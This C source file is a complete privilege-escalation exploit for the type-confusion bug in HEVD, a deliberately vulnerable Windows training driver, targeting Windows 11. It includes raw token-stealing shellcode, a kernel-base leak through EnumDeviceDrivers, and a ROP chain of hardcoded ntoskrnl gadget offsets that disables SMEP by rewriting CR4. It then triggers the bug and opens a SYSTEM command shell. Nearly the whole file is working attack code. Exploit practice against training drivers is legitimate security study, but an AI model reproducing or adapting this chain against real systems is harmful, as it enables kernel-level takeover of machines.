/*
HEVD TypeConfusionObjectInitializer
OS Name	Microsoft Windows 11 Pro
Version	10.0.22631 Build 22631

ntoskrnl Version 10.0.22621.3593

cl /c /Zi /W3 /WX- /diagnostics:column /sdl /O2 /Oi /GL /D NDEBUG /D _CONSOLE /D _UNICODE /D UNICODE /Gm- /EHsc /MD /GS /Gy /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline /permissive- /Fo"x64\Release\\" /Fd"x64\Release\vc143.pdb" /external:W3 /Gd /TC /FC /errorReport:prompt TyCo.c

based on: https://vulndev.io/2022/07/10/windows-kernel-exploitation-hevd-x64-type-confusion/
*/

#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>
#include "TyCo.h"

// Shellcode
BYTE sc[256] = {
  0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d,
  0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xe8, 0x48,
  0x04, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0x40, 0x04, 0x00, 0x00,
  0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x49, 0x8b, 0x88, 0xb8,
  0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
  0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01,
  0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66,
  0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68,
  0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00,
  0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
  0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48,
  0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};

// ASLR Leak
unsigned long long get_kernel_base_addr() {
	LPVOID drivers[1024];
	DWORD cbNeeded;

	EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

	return (unsigned long long)drivers[0];
}

PVOID get_kernel_symbol_addr(const char* symbol) {
	PVOID kernelBaseAddr;
	HMODULE userKernelHandle;
	PCHAR functionAddress;
	unsigned long long offset;

	kernelBaseAddr = (PVOID)get_kernel_base_addr();
	userKernelHandle = LoadLibraryA("C:\\Windows\\System32\\ntoskrnl.exe");

	if (userKernelHandle == INVALID_HANDLE_VALUE) {
		return NULL;
	}

	functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);
	if (functionAddress == NULL) {
		return NULL;
	}

	offset = functionAddress - ((PCHAR)userKernelHandle);
	return (PVOID)(((PCHAR)kernelBaseAddr) + offset);
}

int main()
{
    HANDLE hDevice = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Error: %u\n", GetLastError());
        return -1;
    }

	// Shellcode
	LPVOID shellcode = VirtualAlloc(NULL, 256, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode, sc, 256);
	
	// Gadgets
	QWORD ntBase										= get_kernel_base_addr();
	QWORD pivot_addr									= 0x48000000;
	//TODO: move original rbx value
	QWORD g_mov_esp_0x48000000_add_esp_0x30_pop_rbx_ret = 0x000000000057ad64 + ntBase;
	QWORD g_pop_rcx_ret									= 0x000000000020d810 + ntBase;
	QWORD g_mov_cr4_rcx_ret								= 0x0000000000399047 + ntBase;
	QWORD g_ret											= 0x000000000020008d + ntBase;

	QWORD stackAddr = pivot_addr - 0x1000;
	LPVOID kernelStack = VirtualAlloc(
		(LPVOID)stackAddr,
		0x14000,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	if (!VirtualLock(kernelStack, 0x14000))
		printf("Error using VirtualLock: %d\n", GetLastError());
	
	RtlFillMemory(kernelStack, 0x30, '\x41');

	int index = 0;
	QWORD* rop = (QWORD*)(((QWORD)kernelStack + 0x30) & ~0xF);  // Align to 16 bytes
	*(rop + index++) = g_pop_rcx_ret;
	*(rop + index++) = 0x370E78 ^ 1UL << 20;
	*(rop + index++) = g_mov_cr4_rcx_ret;
	*(rop + index++) = (QWORD)shellcode;

    UserObject userObject	= { 0 };
    userObject.ObjectID		= (ULONG_PTR)0x4141414141414141;
    userObject.ObjectType	= (ULONG_PTR)g_mov_esp_0x48000000_add_esp_0x30_pop_rbx_ret;

	// Output
	printf("[+] Kernel base address: 0x%llx\n", ntBase);
	printf("[+] Pivot gadget address: 0x%llx\n", g_mov_esp_0x48000000_add_esp_0x30_pop_rbx_ret);
	printf("[+] Stack address: 0x%llx\n", pivot_addr);
	// Output

	// Trigger vuln
    DeviceIoControl(hDevice, IOCTL_TYCO, (LPVOID)&userObject, sizeof(userObject), NULL, 0, NULL, NULL);

	system("cmd");
	return 0;
}
